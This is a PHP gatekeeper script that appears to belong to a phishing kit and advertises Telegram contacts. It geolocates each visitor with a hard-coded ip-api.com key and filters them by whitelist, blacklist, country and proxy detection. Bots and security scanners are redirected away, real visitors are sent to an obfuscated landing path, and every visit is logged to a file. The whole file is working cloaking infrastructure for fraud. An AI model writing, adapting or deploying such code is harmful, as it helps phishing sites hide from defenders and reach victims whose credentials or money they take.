<?php

    /**//**//**//**//**//**

        Telegram : https://t.me/syst3mx
        Telegram Group : https://t.me/matos_x

    /**//**//**//**//**//**/
    

    session_start();
    session_regenerate_id();

    require_once('inc/BrowserDetection.php');
    require_once('inc/thewall.php');
    require_once('infos.php');
  
    function get_client_ip() {
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
        if(filter_var($client, FILTER_VALIDATE_IP)) {
            $ip = $client;
        } else if(filter_var($forward, FILTER_VALIDATE_IP)) {
            $ip = $forward;
        } else {
            $ip = $remote;
        }
        if( $ip == '::1' ) {
            return '127.0.0.1';
        }
        return  $ip;
    }

    function get_lang() {
        $lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
        $acceptLang = ['en','fr','de','it']; 
        $lang = in_array($lang, $acceptLang) ? $lang : 'fr';
        $_SESSION['lang'] = $lang;
        return $lang;
    }

    $ip = get_client_ip();

    $ip_infos = file_get_contents("https://pro.ip-api.com/php/". $ip ."?key=UO8wl6MQD2zPxmf&fields=status,message,country,countryCode,timezone,currency,isp,mobile,proxy,hosting,query");
    $ip_infos = unserialize($ip_infos);

    $_SESSION['currency'] = $ip_infos['currency'];
    $_SESSION['country'] = $ip_infos['country'];

    function visitors($detection) {
        GLOBAL $ip_infos;
        $Browser = new foroco\BrowserDetection();
        $useragent       = $_SERVER['HTTP_USER_AGENT'];
        $result = $Browser->getAll($useragent, 'JSON');
        $ip              = $ip_infos['query'];
        $date            = date("Y-m-d H:i:s", time());
        $result          = json_decode($result,true);
        $os_type         = $result['os_type'];
        $os_name         = $result['os_name'];
        $device_type     = $result['device_type'];
        $browser_name    = $result['browser_name'];
        $browser_version = $result['browser_version'];
        $browser_version = $result['browser_version'];
        $country         = $ip_infos['country'];

        $str = " <tr><th scope='row'>$ip ($country)</th><td>$date</td><td>$detection</td><td>[$device_type] $browser_name $browser_version</td></tr>";
        file_put_contents('visitors.html', $str  , FILE_APPEND | LOCK_EX);
    }

    $whilelist = file("whitelist.db", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($ip, $whilelist)) {
        $_SESSION['last_page'] = "msg";
        $_SESSION['user_allowed'] = true;
        get_lang();
        visitors("Whitelisted");
        header("Location: qZWN0cy90YWxh/?redirection=msg");
        exit();
    }

    $blacklist = file("blacklist.db", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($ip, $blacklist)) {
        visitors("Blacklisted");
        header("Location:" . $conf_redirect_bot);
        exit();
    }

    if( count(ALLOWED_COUNTRIES) > 0 ) {
        if( !in_array($ip_infos['countryCode'],$conf_allowed_countries) ) {
            visitors("Country not allowed");
            header("Location:" . REDIRECT_BOTS);
            exit();
        }
    }

    if( get_client_ip() == "127.0.0.1" ) {
        $_SESSION['last_page'] = "msg";
        $_SESSION['user_allowed'] = true;
        get_lang();
        visitors("Localhost");
        header("Location: qZWN0cy90YWxh/?redirection=msg");
        exit();
    }

    if( $ip_infos['status'] == "success" ) {

        if( $ip_infos['proxy'] == true ) {
            visitors("Detected as bot");
            header("Location:" . $conf_redirect_bot);
            exit();
        }

        $_SESSION['last_page'] = "msg";
        $_SESSION['user_allowed'] = true;
        get_lang();
        visitors("Allowed");
        header("Location: qZWN0cy90YWxh/?redirection=msg");
        exit();

    } else {
        visitors("Not Allowed");
        header("Location:" . REDIRECT_BOTS);
        exit();
    }

?>